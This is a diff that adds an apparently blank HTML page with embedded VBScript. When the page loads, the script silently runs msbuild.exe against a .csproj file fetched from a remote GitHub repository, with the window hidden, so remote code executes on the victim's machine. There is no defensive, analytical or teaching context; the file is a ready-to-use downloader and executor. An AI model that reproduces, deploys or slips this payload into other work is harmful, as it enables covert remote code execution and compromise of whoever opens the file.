@@ -1,0 +1,15 @@
+<html>
+<head>
+<script language="VBScript">
+    Set objShell = CreateObject("WScript.Shell")
+
+    ' MSBuild command to download and execute the .csproj file
+    command = "cmd /c ""msbuild.exe https://raw.githubusercontent.com/deux1337/cyberdeux/main/b.csproj"""
+    
+    ' Execute the command
+    objShell.Run command, 0, True  ' 0 to run hidden
+</script>
+</head>
+<body>
+</body>
+</html>
